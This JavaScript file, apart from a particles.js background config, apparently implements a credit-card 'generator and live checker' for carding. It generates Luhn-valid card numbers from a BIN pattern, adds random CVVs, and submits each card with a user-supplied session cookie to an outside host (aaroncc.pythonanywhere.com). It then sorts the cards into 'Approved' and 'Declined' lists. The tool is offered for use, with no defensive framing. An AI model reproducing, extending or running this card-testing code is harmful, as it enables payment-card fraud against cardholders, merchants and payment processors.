
particlesJS('particles-js',
  
  {
    "particles": {
      "number": {
        "value": 80,
        "density": {
          "enable": true,
          "value_area": 800
        }
      },
      "color": {
        "value": "#ffffff"
      },
      "shape": {
        "type": "circle",
        "stroke": {
          "width": 0,
          "color": "#000000"
        },
        "polygon": {
          "nb_sides": 5
        },
        "image": {
          "src": "img/github.svg",
          "width": 100,
          "height": 100
        }
      },
      "opacity": {
        "value": 0.5,
        "random": false,
        "anim": {
          "enable": false,
          "speed": 1,
          "opacity_min": 0.1,
          "sync": false
        }
      },
      "size": {
        "value": 5,
        "random": true,
        "anim": {
          "enable": false,
          "speed": 40,
          "size_min": 0.1,
          "sync": false
        }
      },
      "line_linked": {
        "enable": true,
        "distance": 150,
        "color": "#ffffff",
        "opacity": 0.4,
        "width": 1
      },
      "move": {
        "enable": true,
        "speed": 6,
        "direction": "none",
        "random": false,
        "straight": false,
        "out_mode": "out",
        "attract": {
          "enable": false,
          "rotateX": 600,
          "rotateY": 1200
        }
      }
    },
    "interactivity": {
      "detect_on": "canvas",
      "events": {
        "onhover": {
          "enable": true,
          "mode": "repulse"
        },
        "onclick": {
          "enable": true,
          "mode": "push"
        },
        "resize": true
      },
      "modes": {
        "grab": {
          "distance": 400,
          "line_linked": {
            "opacity": 1
          }
        },
        "bubble": {
          "distance": 400,
          "size": 40,
          "duration": 2,
          "opacity": 8,
          "speed": 3
        },
        "repulse": {
          "distance": 200
        },
        "push": {
          "particles_nb": 4
        },
        "remove": {
          "particles_nb": 2
        }
      }
    },
    "retina_detect": true,
    "config_demo": {
      "hide_card": false,
      "background_color": "#b61924",
      "background_image": "",
      "background_position": "50% 50%",
      "background_repeat": "no-repeat",
      "background_size": "cover"
    }
  }

);


initComponents();
document.querySelector('#btn-generar').addEventListener('click',generarTarjetas);
document.querySelector('#btn-buscar').addEventListener('click',buscarLives);
let lives_cont = 0;
let dead_cont = 0;
let tarjetas = [];

function generarTarjetas(){
    let num = document.querySelector("#gen-num").value;
    let bin = document.querySelector('#gen-bin').value;
    let mes = document.querySelector('#gen-mes').value;
    let anyo = document.querySelector('#gen-anyo').value;
    let cvv = document.querySelector('#gen-cvv').value;
    let field = document.querySelector('#gen-resultado');

    if(bin.length != 16){
        alert('El bin no tiene una longitud válida');
        return;
    }
    tarjetas = [];
    field.value = '';
    for(let i=0;i<num;++i){
        let tarjeta = {
            numero : siguienteValida(bin),
            mes : mes,
            anyo : anyo,
            cvv : (cvv ? cvv : getRandom(100,900))
        }
        field.value += tarjeta.numero + '│' + tarjeta.mes + '│' + tarjeta.anyo + '│' + tarjeta.cvv +'\n';
        tarjetas.push(tarjeta);
    }
}

async function buscarLives(){
    let cookie = document.querySelector('#cookie').value;
    let pEstado = document.querySelector('#p-estado');
    let lives = document.querySelector('#lives');
    let dead = document.querySelector('#dead');
    let hlives = document.querySelector("#lives-cont");
    let hdead = document.querySelector('#dead-cont');

    if(!cookie){
        alert("Sin cookie es imposible buscar lives");
        return;
    }
    if(tarjetas.length == 0){
        alert("No hay tarjetas generadas");
        return;
    }

    document.querySelector('.cheker-container').style.display = "flex";

    pEstado.textContent = "Iniciando...";
    document.querySelector(".loading").style.display = "block";

    for(let i = 0; i < tarjetas.length; ++i){
        pEstado.textContent = "Probando: " + tarjetas[i].numero + '│' + tarjetas[i].mes + '│' + tarjetas[i].anyo + '│' + tarjetas[i].cvv;

        let url = `http://aaroncc.pythonanywhere.com/?numero=${tarjetas[i].numero}&mes=${tarjetas[i].mes}&anyo=${tarjetas[i].anyo}&cookie=${cookie}`;
        
        try{
          const response = await fetch(url);
          const data = await response.json();
          if(data.resultado){
            pEstado.textContent = "CC Live!";
            p = document.createElement('p');
            p.textContent = tarjetas[i].numero + '│' + tarjetas[i].mes + '│' + tarjetas[i].anyo + '│' + tarjetas[i].cvv + " Approved Card";
            lives.appendChild(p);
            lives_cont++;
            hlives.textContent = "LIVES (" + lives_cont + ")";
          }else{
            pEstado.textContent = "CC Dead!"
            p = document.createElement('p');
            p.textContent = tarjetas[i].numero + '│' + tarjetas[i].mes + '│' + tarjetas[i].anyo + '│' + tarjetas[i].cvv + " Declined Card";
            dead.appendChild(p);
            dead_cont++;
            hdead.textContent = "DEAD (" + dead_cont + ")";
          }
        }catch(error){

          alert("El proceso finalizó debido a un error: Verifica que tu cookie no tenga tarjetas asociadas");
          break;
        }
        
    }
    
    pEstado.textContent = "Proceso finalizado";
    document.querySelector(".loading").style.display = "none";
}
function siguienteValida(bin){
    while(true){
        let nueva_cadena = '';
        for(let i=0;i<16;++i){
            if(bin[i] == 'x'){
                nueva_cadena += String.fromCharCode(48 + getRandom(0,9));
            }else{
                nueva_cadena += bin[i];
            }
        }
        if(checkLuhn(nueva_cadena)){
            return nueva_cadena;
        }
    }
    
}
function checkLuhn(cardNo)
    {
        let nDigits = cardNo.length;
 
        let nSum = 0;
        let isSecond = false;
        for (let i = nDigits - 1; i >= 0; i--)
        {
 
            let d = cardNo[i].charCodeAt() - '0'.charCodeAt();
 
            if (isSecond == true)
                d = d * 2;
 
            // We add two digits to handle
            // cases that make two digits
            // after doubling
            nSum += parseInt(d / 10, 10);
            nSum += d % 10;
 
            isSecond = !isSecond;
        }
        return (nSum % 10 == 0);
    }

function initComponents(){
    let anyo = document.querySelector("#gen-anyo");
    for(let i=2023; i<=2040; ++i){
        e = document.createElement('option');
        e.value = i;
        e.text = i;
        anyo.add(e);
    }
}
function getRandom(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1) + min);
}